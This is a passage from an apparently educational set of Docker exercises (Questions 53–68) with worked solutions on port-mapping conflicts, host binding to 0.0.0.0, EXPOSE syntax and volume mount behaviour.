- Production: Use `-p` with specific ports
- Development: `-P` is fine for quick tests
- Always know which ports your app uses
- Document port usage in Dockerfile with EXPOSE

---

### Question 53
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
RUN npm install
EXPOSE 3000
CMD ["npm", "start"]
```

**Commands:**
```bash
docker run -d --name app1 -p 3000:3000 myapp
docker run -d --name app2 -p 3000:3000 myapp
```

**Tasks:**
a. What will happen with the second container?  
b. How to run multiple instances?

**Solution:**

**a. What Happens:**

1. **Error:** Second container fails to start
2. **Error:** Host port 3000 already in use by app1

**Error Message:**
```
Error: bind: address already in use
```

**b. Running Multiple Instances:**

**Option 1: Different host ports:**
```bash
docker run -d --name app1 -p 3000:3000 myapp
docker run -d --name app2 -p 3001:3000 myapp
docker run -d --name app3 -p 3002:3000 myapp
```

**Option 2: Let Docker assign ports:**
```bash
docker run -d --name app1 -p 3000 myapp  # Random host port
docker run -d --name app2 -p 3000 myapp  # Different random host port
docker port app1  # Check assigned port
docker port app2
```

**Option 3: Use load balancer:**
```yaml
# docker-compose.yml
version: '3.8'
services:
  nginx:
    image: nginx
    ports:
      - "80:80"
    depends_on:
      - app
  
  app:
    build: .
    deploy:
      replicas: 3
    expose:
      - "3000"
```

**Option 4: No port mapping (internal only):**
```bash
docker network create mynet
docker run -d --name app1 --network mynet myapp
docker run -d --name app2 --network mynet myapp
# Containers can talk to each other, but not exposed to host
```

**Explanation for Beginners:**

**Port Conflicts:**
- Each host port can only be used once
- Multiple containers can use same container port (they're isolated)
- Use different host ports to run multiple instances

**Strategies for Multiple Instances:**

**1. Sequential ports:**
```bash
docker run -p 3000:3000 app1
docker run -p 3001:3000 app2
docker run -p 3002:3000 app3
```

**2. Dynamic ports:**
```bash
docker run -p 3000 app  # Docker assigns random host port
```

**3. Internal only:**
```bash
# No -p flag - only accessible within Docker network
docker run --network mynet app
```

**4. Behind load balancer:**
```
                ┌──> app1:3000
Internet → nginx├──> app2:3000
          :80  └──> app3:3000
```

---

### Question 54
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
EXPOSE 8000/tcp
EXPOSE 8000/udp
CMD ["python", "app.py"]
```

**Tasks:**
a. How do you map both TCP and UDP?  
b. Write the correct run command

**Solution:**

**a. Mapping Both Protocols:**

**Correct Command:**
```bash
docker run -d \
  -p 8000:8000/tcp \
  -p 8000:8000/udp \
  --name myapp \
  myapp
```

**Explanation:**
- Need separate `-p` flags for TCP and UDP
- Both can use same port number
- Specify protocol explicitly

**Alternative forms:**
```bash
# Explicit protocol
-p 8000:8000/tcp -p 8000:8000/udp

# TCP is default (can omit for TCP)
-p 8000:8000 -p 8000:8000/udp

# Different host ports
-p 9000:8000/tcp -p 9001:8000/udp
```

**Explanation for Beginners:**

**Protocol-Specific Port Mapping:**

**TCP (default):**
```bash
-p 8000:8000        # Same as -p 8000:8000/tcp
```

**UDP (must specify):**
```bash
-p 8000:8000/udp
```

**Both:**
```bash
-p 8000:8000/tcp -p 8000:8000/udp
```

**Use cases:**
- TCP: Web servers, APIs, most applications
- UDP: DNS, video streaming, gaming servers
- Both: Some applications need both protocols on same port

**Verifying ports:**
```bash
docker ps
# Shows: 0.0.0.0:8000->8000/tcp, 0.0.0.0:8000->8000/udp

docker port myapp
# 8000/tcp -> 0.0.0.0:8000
# 8000/udp -> 0.0.0.0:8000
```

---

### Question 55
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
RUN npm install
CMD ["npm", "start"]
```

**Commands:**
```bash
docker run -d --name app myapp
curl localhost:3000
```

**Tasks:**
a. Why does curl fail?  
b. What's missing?

**Solution:**

**a. Why Curl Fails:**

1. **Error:** No port mapping specified
2. **Error:** Container port 3000 not published to host
3. **Error:** Can't access container ports without mapping

**What Happens:**
```
docker run -d --name app myapp
# Container starts, app listens on 3000 INSIDE container
# But port not published to host

curl localhost:3000
# Tries to access host:3000 (nothing listening there)
# Connection refused!
```

**b. Corrected Command:**

```bash
docker run -d --name app -p 3000:3000 myapp
curl localhost:3000
# Now works!
```

**Or different host port:**
```bash
docker run -d --name app -p 8080:3000 myapp
curl localhost:8080
```

**Explanation for Beginners:**

**EXPOSE vs Port Publishing:**

**EXPOSE (in Dockerfile):**
```dockerfile
EXPOSE 3000
# Documentation only
# Doesn't actually publish port
# Tells users which port the app uses
```

**-p flag (at runtime):**
```bash
docker run -p 3000:3000
# Actually publishes port
# Makes container port accessible from host
```

**Complete Flow:**
```dockerfile
# 1. Dockerfile documents the port
FROM node:14
WORKDIR /app
COPY . .
EXPOSE 3000           # Documentation
CMD ["npm", "start"]  # App listens on 3000
```

```bash
# 2. Run with port mapping
docker run -p 3000:3000 myapp  # Publish port

# 3. Access from host
curl localhost:3000            # Works!
```

**Port Accessibility:**

**Without -p:**
```bash
docker run -d myapp
# Port 3000 only accessible:
# - From inside the container
# - From other containers on same network
# NOT accessible from host
```

**With -p:**
```bash
docker run -d -p 3000:3000 myapp
# Port 3000 accessible:
# - From host machine
# - From other containers
# - From external network (if host allows)
```

---

### Question 56
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
EXPOSE 0.0.0.0:8000
CMD ["python", "app.py"]
```

**Tasks:**
a. What's wrong with EXPOSE syntax?  
b. Fix it

**Solution:**

**a. Error:**

1. **Error:** EXPOSE doesn't accept IP addresses
2. **Error:** EXPOSE only takes port number and optional protocol
3. **Error:** 0.0.0.0 binding is handled by the application, not EXPOSE

**Corrected Dockerfile:**

```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
EXPOSE 8000
CMD ["python", "app.py"]
```

**In your Python app:**
```python
# app.py
from flask import Flask
app = Flask(__name__)

if __name__ == '__main__':
    # Bind to 0.0.0.0 in the application code
    app.run(host='0.0.0.0', port=8000)
```

**Explanation for Beginners:**

**EXPOSE Syntax:**

**Correct:**
```dockerfile
EXPOSE 8000              # Port only
EXPOSE 8000/tcp          # Port with protocol
EXPOSE 8000/udp          # UDP protocol
EXPOSE 8000 8080 8443    # Multiple ports
```

**Incorrect:**
```dockerfile
EXPOSE 0.0.0.0:8000      # Error! No IP addresses
EXPOSE localhost:8000    # Error! No hostnames
EXPOSE 8000-9000         # Error! No port ranges (do them separately)
```

**Host Binding:**
- EXPOSE: Documents port number
- Application code: Controls which interface (0.0.0.0, localhost, etc.)
- docker run -p: Maps ports and can specify host IP

**Application Binding:**
```python
# Bind to localhost only (not accessible from outside container)
app.run(host='127.0.0.1', port=8000)

# Bind to all interfaces (accessible from outside)
app.run(host='0.0.0.0', port=8000)
```

**Docker port mapping with host IP:**
```bash
# Bind to all host interfaces
docker run -p 8000:8000 myapp

# Bind to localhost only
docker run -p 127.0.0.1:8000:8000 myapp

# Bind to specific IP
docker run -p 192.168.1.100:8000:8000 myapp
```

---

### Question 57
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
ENV HOST=localhost
ENV PORT=3000
CMD ["npm", "start"]
```

**package.json:**
```json
{
  "scripts": {
    "start": "node server.js"
  }
}
```

**server.js:**
```javascript
const express = require('express');
const app = express();
app.listen(process.env.PORT, process.env.HOST);
```

**Tasks:**
a. What's the problem with HOST=localhost?  
b. Fix it

**Solution:**

**a. Problem:**

1. **Error:** HOST=localhost means app only listens on loopback interface
2. **Error:** Not accessible from outside container
3. **Error:** docker run -p won't work - connection refused

**What Happens:**
```
App binds to localhost (127.0.0.1) inside container
Only accessible within container itself
Port mapping exists but connection refused from host
```

**Corrected Dockerfile:**

```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
ENV HOST=0.0.0.0
ENV PORT=3000
EXPOSE 3000
CMD ["npm", "start"]
```

**Explanation for Beginners:**

**Host Binding in Containers:**

**localhost (127.0.0.1):**
```javascript
app.listen(3000, 'localhost');
// Only accessible from inside container
// docker run -p 3000:3000 won't work!
```

**0.0.0.0 (all interfaces):**
```javascript
app.listen(3000, '0.0.0.0');
// Accessible from outside container
// docker run -p 3000:3000 works!
```

**Container Networking:**
```
Container has multiple interfaces:
- lo (localhost/127.0.0.1): Internal only
- eth0 (172.17.0.x): Docker network
  
Binding to 0.0.0.0: Listens on ALL interfaces
Binding to localhost: Listens ONLY on loopback
```

**Best Practice:**
Always bind to `0.0.0.0` in containerized applications:

```python
# Python Flask
app.run(host='0.0.0.0', port=5000)

# Python FastAPI
uvicorn.run(app, host='0.0.0.0', port=8000)
```

```javascript
// Node.js Express
app.listen(3000, '0.0.0.0');

// Or omit host (defaults to 0.0.0.0)
app.listen(3000);
```

```java
// Java Spring Boot
// application.properties
server.address=0.0.0.0
server.port=8080
```

---

### Question 58
**Dockerfile:**
```dockerfile
FROM nginx
COPY index.html /usr/share/nginx/html/
EXPOSE 80
```

**Commands:**
```bash
docker build -t web .
docker run -d web
docker run -d web
curl localhost:80
```

**Tasks:**
a. Why doesn't curl work?  
b. How to access the containers?

**Solution:**

**a. Why Curl Fails:**

1. **Error:** No port mapping specified with `-p`
2. **Issue:** Both containers running but ports not published
3. **Issue:** Can't access unexposed container ports

**What Happens:**
```
Container 1: Running, nginx on port 80 (internal)
Container 2: Running, nginx on port 80 (internal)
Host: No ports published
curl localhost:80 → Nothing listening on host!
```

**b. Corrected Approach:**

**Option 1: Map ports explicitly:**
```bash
docker build -t web .
docker run -d --name web1 -p 8080:80 web
docker run -d --name web2 -p 8081:80 web
curl localhost:8080  # Access first container
curl localhost:8081  # Access second container
```

**Option 2: Load balancer:**
```yaml
# docker-compose.yml
version: '3.8'
services:
  nginx-lb:
    image: nginx
    ports:
      - "80:80"
    volumes:
      - ./nginx-lb.conf:/etc/nginx/nginx.conf
    depends_on:
      - web1
      - web2
  
  web1:
    build: .
    expose:
      - "80"
  
  web2:
    build: .
    expose:
      - "80"
```

**Explanation for Beginners:**

**Port Publishing Rules:**
- EXPOSE alone doesn't publish ports
- Need `-p` flag with docker run
- Each host port can only be used once
- Multiple containers need different host ports

**Accessing Containers:**

**Method 1: Published ports:**
```bash
docker run -p 8080:80 web
curl localhost:8080
```

**Method 2: From another container:**
```bash
docker network create mynet
docker run -d --name web --network mynet nginx
docker run --network mynet curlimages/curl curl http://web:80
```

**Method 3: Docker exec:**
```bash
docker exec web curl localhost:80
```

---

### Question 59
**Dockerfile:**
```dockerfile
FROM golang:1.17
WORKDIR /app
COPY . .
RUN go build -o app
EXPOSE 8080-8090
CMD ["./app"]
```

**Tasks:**
a. What's wrong with EXPOSE range?  
b. How to handle multiple ports?

**Solution:**

**a. Error:**

1. **Error:** EXPOSE doesn't support port ranges (8080-8090)
2. **Error:** Need to list each port individually

**Corrected Dockerfile:**

**Option 1: List ports individually:**
```dockerfile
FROM golang:1.17-alpine AS build
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -o app

FROM alpine:latest
WORKDIR /app
COPY --from=build /app/app .
EXPOSE 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090
CMD ["./app"]
```

**Option 2: If app dynamically chooses ports:**
```dockerfile
FROM alpine:latest
WORKDIR /app
COPY --from=build /app/app .
# Don't EXPOSE - let user specify ports needed
CMD ["./app"]
```

```bash
# Map only ports actually used
docker run -p 8080:8080 -p 8081:8081 myapp
```

**Option 3: Use single port with load balancer:**
```dockerfile
FROM alpine:latest
WORKDIR /app
COPY --from=build /app/app .
EXPOSE 8080
CMD ["./app"]
```

**Explanation for Beginners:**

**EXPOSE Limitations:**
- Must list each port individually
- No range syntax
- Can expose multiple ports
- It's documentation, not actual port publishing

**Examples:**
```dockerfile
# Correct
EXPOSE 80 443 8080

# Correct with protocols
EXPOSE 80/tcp 443/tcp 53/udp

# Wrong
EXPOSE 8000-9000        # Not supported!
EXPOSE 8000,8001,8002   # Wrong syntax!
```

**When to use multiple ports:**
- HTTP (80) and HTTPS (443)
- Application port (8080) and metrics port (9090)
- Main service and admin interface

**Running with multiple ports:**
```bash
docker run -d \
  -p 80:80 \
  -p 443:443 \
  -p 9090:9090 \
  myapp
```

---

### Question 60
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
EXPOSE 5000
CMD ["flask", "run"]
```

**Command:**
```bash
docker run -d -p 5000:5000 myapp
curl localhost:5000
```

**Tasks:**
a. Why might curl fail even with port mapping?  
b. What's likely wrong?

**Solution:**

**a. Why Curl Fails:**

1. **Issue:** Flask development server binds to localhost by default
2. **Issue:** Need to explicitly bind to 0.0.0.0
3. **Issue:** Default `flask run` only listens on 127.0.0.1

**What Happens:**
```
flask run (default) → binds to 127.0.0.1:5000
Port mapping: host:5000 → container:5000
But Flask only listens on localhost inside container!
Connection refused from host
```

**b. Corrected Dockerfile:**

**Option 1: Add host flag:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["flask", "run", "--host=0.0.0.0"]
```

**Option 2: Use environment variable:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
ENV FLASK_RUN_HOST=0.0.0.0
EXPOSE 5000
CMD ["flask", "run"]
```

**Option 3: Production with gunicorn:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt gunicorn
COPY . .
EXPOSE 8000
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:app"]
```

**Explanation for Beginners:**

**Common "Connection Refused" Causes:**

**1. App binds to localhost:**
```bash
# Wrong
flask run  # Defaults to 127.0.0.1

# Right
flask run --host=0.0.0.0
```

**2. No port mapping:**
```bash
# Wrong
docker run myapp

# Right
docker run -p 5000:5000 myapp
```

**3. Wrong port numbers:**
```bash
# App listens on 5000, but mapping to 3000
docker run -p 3000:3000 myapp  # Wrong!
docker run -p 3000:5000 myapp  # Correct if app uses 5000
```

**Framework-Specific Binding:**

**Flask:**
```python
app.run(host='0.0.0.0', port=5000)
# or
flask run --host=0.0.0.0 --port=5000
```

**Django:**
```bash
python manage.py runserver 0.0.0.0:8000
```

**Express (Node.js):**
```javascript
app.listen(3000, '0.0.0.0');
// or just
app.listen(3000);  // Defaults to 0.0.0.0
```

**FastAPI:**
```bash
uvicorn app:app --host 0.0.0.0 --port 8000
```

**Testing connectivity:**
```bash
# Inside container
docker exec -it myapp sh
netstat -tlnp  # Check what's listening

# From host
docker ps  # Verify port mapping
curl localhost:5000
telnet localhost 5000
```

---

## Questions 61-70: Volume and Storage Errors

### Question 61
**Dockerfile:**
```dockerfile
FROM postgres:14
VOLUME /data
COPY init.sql /docker-entrypoint-initdb.d/
```

**Command:**
```bash
docker run -d -v /data:/var/lib/postgresql/data postgres-app
```

**Tasks:**
a. What's the confusion with volumes?  
b. Fix the configuration

**Solution:**

**a. Confusion:**

1. **Issue:** VOLUME /data in Dockerfile creates anonymous volume at /data
2. **Issue:** But PostgreSQL data is in /var/lib/postgresql/data
3. **Issue:** -v flag tries to use /data as host path (bind mount)
4. **Issue:** VOLUME /data doesn't affect PostgreSQL data location

**What Happens:**
```
VOLUME /data → Creates anonymous volume mounted at /data (wrong location!)
PostgreSQL stores data in /var/lib/postgresql/data (not mounted)
-v /data:/var/lib/postgresql/data → Tries bind mount from host /data
```

**Corrected Dockerfile:**

```dockerfile
FROM postgres:14
# Don't specify VOLUME - postgres image already does this correctly
COPY init.sql /docker-entrypoint-initdb.d/
# postgres official image has: VOLUME /var/lib/postgresql/data
```

**Corrected Commands:**

**Option 1: Named volume (recommended):**
```bash
docker volume create pgdata
docker run -d \
  --name postgres-db \
  -e POSTGRES_PASSWORD=secret \
  -v pgdata:/var/lib/postgresql/data \
  postgres-app
```

**Option 2: Bind mount:**
```bash
docker run -d \
  --name postgres-db \
  -e POSTGRES_PASSWORD=secret \
  -v /host/path/pgdata:/var/lib/postgresql/data \
  postgres-app
```

**Option 3: Anonymous volume:**
```bash
docker run -d \
  --name postgres-db \
  -e POSTGRES_PASSWORD=secret \
  postgres-app
# Creates anonymous volume automatically
```

**Explanation for Beginners:**

**VOLUME in Dockerfile:**
- Declares which directories should be volumes
- Docker automatically creates anonymous volume if not specified
- Don't override volumes declared in base images

**PostgreSQL Official Image:**
```dockerfile
# postgres official image already has:
VOLUME /var/lib/postgresql/data
```

**Volume Types:**

**1. Named volume:**
```bash
docker volume create mydata
docker run -v mydata:/var/lib/postgresql/data postgres
# Managed by Docker, persistent
```

**2. Anonymous volume:**
```bash
docker run postgres
# Docker creates volume with random name
# Harder to manage
```

**3. Bind mount:**
```bash
docker run -v /host/path:/var/lib/postgresql/data postgres
# Direct host access
# Good for development
```

**Best practice for databases:**
Use named volumes for data persistence!

---

### Question 62
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
RUN npm install
VOLUME /app/node_modules
CMD ["npm", "start"]
```

**Command:**
```bash
docker run -v $(pwd):/app myapp
```

**Tasks:**
a. What happens to node_modules?  
b. Is this correct?

**Solution:**

**a. What Happens:**

1. **Complex:** Volume mount $(pwd):/app overlays the /app directory
2. **But:** VOLUME /app/node_modules creates a volume that "protects" node_modules
3. **Result:** /app from host, but /app/node_modules from image
4. **Intended:** This is actually a workaround to preserve node_modules

**Behavior:**
```
Image has:
/app/
├── node_modules/ (from RUN npm install)
└── src/

After docker run -v $(pwd):/app:
/app/                      (from host)
├── node_modules/          (from container volume - protected!)
└── src/                   (from host)
```

**b. Is This Correct?**

**For Development:** Yes, this is a known pattern to avoid overwriting node_modules

**Better Approaches:**

**Option 1: Named volume for node_modules:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
CMD ["npm", "start"]
```

```bash
docker run -d \
  -v $(pwd):/app \
  -v /app/node_modules \
  myapp
# Anonymous volume for node_modules
```

**Option 2: Don't mount entire directory:**
```bash
docker run -d \
  -v $(pwd)/src:/app/src \
  myapp
# Only mount source code, not node_modules
```

**Option 3: Use docker-compose:**
```yaml
version: '3.8'
services:
  app:
    build: .
    volumes:
      - .:/app
      - /app/node_modules
    ports:
      - "3000:3000"
```

**Explanation for Beginners:**

**Volume Mounting Priority:**
1. More specific volumes take precedence
2. VOLUME in Dockerfile creates mount point
3. -v at runtime can be overridden by more specific -v

**The node_modules Problem:**
```
Host has node_modules (for IDE, maybe Windows-based)
Container needs node_modules (Linux-based)
Mounting host directory overwrites container's node_modules
Solution: Create volume specifically for node_modules
```

**Pattern for Development:**
```bash
docker run \
  -v $(pwd):/app \              # Mount source code
  -v /app/node_modules \        # Protect node_modules
  -v /app/build \               # Protect build artifacts
  myapp
```

This preserves container-generated files while allowing live editing of source code.

---

### Question 63
**Dockerfile:**
```dockerfile
FROM python:3.9
VOLUME ["/app/data", "/app/logs"]
WORKDIR /app
COPY . .
CMD ["python", "app.py"]
```

**Command:**
```bash
docker run -v mydata:/app/data myapp
```

**Tasks:**
a. What happens to /app/logs?  
b. How to manage both volumes?

**Solution:**

**a. What Happens:**

1. **Answer:** /app/logs gets an anonymous volume (random name)
2. **Answer:** /app/data gets the named volume "mydata"
3. **Issue:** Anonymous volume for /app/logs is hard to manage

**Result:**
```
/app/data → mydata (named volume, specified)
/app/logs → random_name (anonymous volume, auto-created)
```

**b. Managing Both Volumes:**

**Option 1: Specify both:**
```bash
docker run -d \
  -v mydata:/app/data \
  -v mylogs:/app/logs \
  myapp
```

**Option 2: Create volumes first:**
```bash
docker volume create mydata
docker volume create mylogs

docker run -d \
  --name myapp \
  -v mydata:/app/data \
  -v mylogs:/app/logs \
  myapp
```

**Option 3: Use docker-compose:**
```yaml
version: '3.8'
services:
  app:
    build: .
    volumes:
      - mydata:/app/data
      - mylogs:/app/logs

volumes:
  mydata:
  mylogs:
```

**Explanation for Beginners:**

**VOLUME Directive:**
- Declares mount points
- Docker creates anonymous volumes if not specified at runtime
- Can declare multiple volumes

**Finding Anonymous Volumes:**
```bash
docker volume ls
# DRIVER    VOLUME NAME
# local     mydata
# local     a1b2c3d4...   ← Anonymous volume
```

**Named vs Anonymous Volumes:**

**Named (Good for production):**
```bash
docker run -v pgdata:/var/lib/postgresql/data postgres
# Easy to find: docker volume ls | grep pgdata
# Easy to backup: docker run --rm -v pgdata:/data -v $(pwd):/backup ubuntu tar czf /backup/pgdata.tar.gz /data
```

**Anonymous (Harder to manage):**
```bash
docker run postgres
# Volume created with random name
# Hard to identify which volume belongs to which container
```

**Best Practices:**
1. Always use named volumes for important data
2. Create volumes explicitly before running containers
3. Use docker-compose volumes section
4. Document which volumes your app needs

---

### Question 64
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
RUN npm install
CMD ["npm", "start"]
```

**Command:**
```bash
docker run -v /app/node_modules myapp
```

**Tasks:**
a. What's wrong with this volume mount?  
b. Explain what happens

**Solution:**

**a. Error:**

1. **Error:** Volume syntax incomplete - missing source
2. **Error:** `/app/node_modules` looks like a bind mount but has no source
3. **Result:** Creates anonymous volume, not bind mount

**What Happens:**
```
-v /app/node_modules
# This is interpreted as anonymous volume mounted at /app/node_modules
# Not a bind mount!
```

**Corrected Usage:**

**Option 1: Anonymous volume (for protecting node_modules):**
```bash
docker run -d \
  -v $(pwd):/app \
  -v /app/node_modules \
  myapp
# Anonymous volume protects node_modules from being overwritten
```

**Option 2: Named volume:**
```bash
docker run -d \
  -v $(pwd):/app \
  -v node_modules:/app/node_modules \
  myapp
```

**Option 3: With --mount (more explicit):**
```bash
docker run -d \
  --mount type=bind,source=$(pwd),target=/app \
  --mount type=volume,target=/app/node_modules \
  myapp
```

**Explanation for Beginners:**

**Volume Mount Syntax:**

**Bind mount (host path):**
```bash
-v /host/path:/container/path     # Full path
-v $(pwd):/app                     # Current directory
-v ~/data:/app/data                # Home directory
```

**Named volume:**
```bash
-v volume_name:/container/path
-v mydata:/app/data
```

**Anonymous volume:**
```bash
-v /container/path
-v /app/node_modules
# Docker creates volume with random name
```

**The Pattern:**
```
source:destination  → Bind mount or named volume
:destination        → Anonymous volume
```

**Example:**
```bash
# Bind mount
-v /home/user/code:/app           # source:destination

# Named volume
-v mycode:/app                    # name:destination

# Anonymous volume
-v /app                           # :destination (source missing)
```

**Modern --mount syntax (clearer):**
```bash
# Bind mount
--mount type=bind,source=/host/path,target=/container/path

# Named volume
--mount type=volume,source=mydata,target=/container/path

# Anonymous volume
--mount type=volume,target=/container/path
```

---

### Question 65
**Dockerfile:**
```dockerfile
FROM alpine
WORKDIR /app
COPY . .
VOLUME ["/app"]
CMD ["./start.sh"]
```

**Command:**
```bash
docker run -d myapp
docker exec myapp vi /app/config.txt
```

**Tasks:**
a. Why can't you edit the file?  
b. Explain volume behavior

**Solution:**

**a. Why You Can't Edit:**

1. **Explanation:** VOLUME /app creates an anonymous volume
2. **Behavior:** Files copied before VOLUME are in the volume
3. **But:** If vi isn't installed, you can't edit
4. **Also:** Anonymous volumes can make file changes confusing

**What Happens:**
```
COPY . . → Files copied to /app
VOLUME /app → /app becomes a mount point
Anonymous volume created with current /app contents
Changes to files depend on volume driver
```

**b. Better Approaches:**

**Option 1: Don't use VOLUME for application code:**
```dockerfile
FROM alpine
RUN apk add --no-cache bash vim  # Install editor if needed
WORKDIR /app
COPY . .
# No VOLUME here!
CMD ["./start.sh"]
```

```bash
docker run -d --name myapp myapp
docker exec -it myapp vi /app/config.txt
# Now works!
```

**Option 2: Volume only for data:**
```dockerfile
FROM alpine
WORKDIR /app
COPY . .
# Only declare volume for data directory
VOLUME ["/app/data"]
CMD ["./start.sh"]
```

**Option 3: Mount for development:**
```dockerfile
FROM alpine
WORKDIR /app
COPY . .
CMD ["./start.sh"]
```

```bash
# Development: mount source code
docker run -d -v $(pwd):/app myapp

# Production: use baked-in files
docker run -d myapp
```

**Explanation for Beginners:**

**VOLUME Directive Behavior:**

**Before VOLUME:**
```dockerfile
WORKDIR /app
COPY . .
# Files are in image layer
```

**After VOLUME:**
```dockerfile
WORKDIR /app
COPY . .
VOLUME /app
# Files copied to volume
# /app is now a mount point
```

**What VOLUME Does:**
1. Marks directory as mount point
2. Data in this directory goes to volume
3. Volume persists after container deletion
4. If no volume specified at runtime, creates anonymous volume

**When to Use VOLUME:**
- Database data directories
- Log directories
- User uploaded files
- Any data that should persist

**When NOT to Use VOLUME:**
- Application code
- Configuration files (unless you want them mutable)
- Static assets

**Example - Database:**
```dockerfile
FROM postgres:14
# VOLUME /var/lib/postgresql/data already declared in base image
# This is correct - data should be in volume
```

**Example - Web App:**
```dockerfile
FROM nginx
COPY html/ /usr/share/nginx/html/
# No VOLUME - static files should be in image
```

**Example - Mixed:**
```dockerfile
FROM myapp
COPY app/ /app/              # Application code - no volume
VOLUME /app/uploads          # User uploads - needs volume
VOLUME /app/logs             # Logs - needs volume
```

---

### Question 66
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
RUN npm install
VOLUME /app
CMD ["npm", "start"]
```

**Command:**
```bash
docker run -v $(pwd)/src:/app/src myapp
```

**Tasks:**
a. What's the conflict?  
b. How do volumes interact?

**Solution:**

**a. The Conflict:**

1. **Issue:** VOLUME /app declares entire /app as volume
2. **Issue:** But runtime -v mounts /app/src specifically
3. **Behavior:** More specific mount wins
4. **Result:** Complex mount behavior

**What Happens:**
```
VOLUME /app → /app should be a volume
-v $(pwd)/src:/app/src → More specific, overrides part of /app
Result:
  /app/src → from host (bind mount)
  /app/* (rest) → from container (volume)
```

**b. How Volumes Interact:**

**Volume Priority (most specific wins):**
```bash
docker run \
  -v /app \                    # Less specific
  -v /app/node_modules \       # More specific (wins for node_modules)
  -v $(pwd)/src:/app/src \     # Most specific (wins for src)
  myapp

Result:
/app/src → host
/app/node_modules → anonymous volume
/app/* (rest) → anonymous volume from first -v
```

**Corrected Approaches:**

**Option 1: Remove VOLUME from Dockerfile:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
# No VOLUME declaration
CMD ["npm", "start"]
```

```bash
# Mount what you need at runtime
docker run -v $(pwd)/src:/app/src myapp
```

**Option 2: Use docker-compose for complex mounts:**
```yaml
version: '3.8'
services:
  app:
    build: .
    volumes:
      - ./src:/app/src         # Source code
      - /app/node_modules      # Protect node_modules
      - logs:/app/logs         # Named volume for logs
    ports:
      - "3000:3000"

volumes:
  logs:
```

**Explanation for Beginners:**

**Mount Precedence Rules:**
1. More specific paths take precedence
2. Runtime -v overrides Dockerfile VOLUME
3. Later -v flags can override earlier ones

**Example:**
```bash
docker run \
  -v /app \              # All of /app is volume
  -v $(pwd)/src:/app/src # But /app/src comes from host
```

Result:
```
/app/src/file.js → from host
/app/package.json → from volume
/app/node_modules → from volume
```

**Best Practices:**
1. Use VOLUME only for data that should always be in volumes (database data, uploads)
2. Don't use VOLUME for application code
3. Mount specific directories at runtime as needed
4. Use docker-compose to manage complex mount scenarios

---

### Question 67
**Command:**
```bash
docker run -v data:/app/data -v data:/app/backup myapp
```

**Tasks:**
a. What happens when same volume mounted twice?  
b. Is this valid?

**Solution:**

**a. What Happens:**

1. **Behavior:** Same volume mounted at two different paths
2. **Result:** Both paths point to same data
3. **This is valid:** Docker allows it
4. **Use case:** Might be intentional for shared storage

**Result:**
```
Volume "data" mounted at:
- /app/data
- /app/backup

Files created in /app/data are visible in /app/backup
They're the same storage!
```

**b. Valid Use Cases:**

**Valid: Shared storage:**
```bash
docker run \
  -v shared:/app/input \
  -v shared:/app/output \
  processor-app
# App reads from /app/input, writes to /app/output
# Both use same storage
```

**Probably a mistake: Intended different volumes:**
```bash
# Wrong
docker run -v data:/app/data -v data:/app/backup myapp

# Probably intended
docker run -v appdata:/app/data -v backupdata:/app/backup myapp
```

**Explanation for Beginners:**

**Multiple Mount Points:**
- Same volume can be mounted at different paths
- Changes in one location visible in other
- Useful for shared storage scenarios
- Usually you want different volumes for different purposes

**Example:**
```bash
# Create volume
docker volume create shared-storage

# Use it twice
docker run \
  -v shared-storage:/input \
  -v shared-storage:/output \
  myapp

# Write to /input
docker exec myapp touch /input/test.txt

# Visible in /output
docker exec myapp ls /output
# test.txt appears!
```

**When this makes sense:**
- Shared cache directories
- Inter-process communication
- Multiple views of same data

**When this is a mistake:**
- Wanted separate data and backup volumes
- Confused volume names
- Typo in volume name

---

### Question 68
**Dockerfile:**
```dockerfile
FROM alpine
WORKDIR /data
COPY --chown=1000:1000 . .
VOLUME /data
USER 1000
CMD ["./app"]
```

**Command:**
```bash
docker run -v /host/data:/data myapp
```

**Tasks:**
a. What happens to file ownership?  
b. Explain the behavior

**Solution:**

**a. What Happens:**

1. **Issue:** COPY --chown sets ownership in image layer
2. **Issue:** Volume mount overrides the /data directory
3. **Result:** File ownership from image layer is lost
4. **Result:** Mounted directory uses host filesystem permissions

**What Happens:**
```
Build time:
COPY --chown=1000:1000 . /data
# Files owned by UID 1000 in image layer

Runtime:
-v /host/data:/data
# Volume mount replaces /data
# Files have ownership from host filesystem
# Image layer ownership doesn't matter
```

**b. Corrected Approaches:**

**Option 1: Set ownership at runtime:**
```dockerfile
FROM alpine
WORKDIR /data
COPY . .
# Remove VOLUME and ownership from build
CMD ["./app"]
```

**entrypoint.sh:**
```bash
#!/bin/sh
# Fix ownership at startup
chown -R 1000:1000 /data
exec su-exec 1000:1000 "$@"
```

**Option 2: Match host UID:**
```bash
# Build with matching UID
docker build --build-arg UID=$(id -u) -t myapp .
```

```dockerfile
FROM alpine
ARG UID=1000
WORKDIR /data
RUN adduser -D -u ${UID} appuser
COPY --chown=appuser:appuser . .
USER appuser
CMD ["./app"]
```

**Option 3: Use named volume:**
```bash
# Named volumes initialized with container ownership
docker run -v appdata:/data myapp
# First time: volume initialized with files from image (correct ownership)
```

